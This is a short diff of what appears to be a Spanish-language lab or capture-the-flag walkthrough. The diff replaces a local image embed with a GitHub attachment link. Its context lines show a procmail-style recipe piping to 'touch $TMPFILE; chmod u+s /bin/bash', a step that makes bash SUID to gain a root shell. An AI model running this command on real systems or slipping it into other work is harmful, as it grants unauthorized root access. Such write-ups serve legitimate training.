@@ -57,7 +57,8 @@ ahora colocamos el mismo comando pero lo modificamos
      :0
 	 | touch $TMPFILE; chmod u+s /bin/bash
 
-![[bash.png]]
+![image](https://github.com/user-attachments/assets/6785be7e-9982-4348-b33d-ba883b79815c)
+
 
 volvemos a lanzar el comando:
 
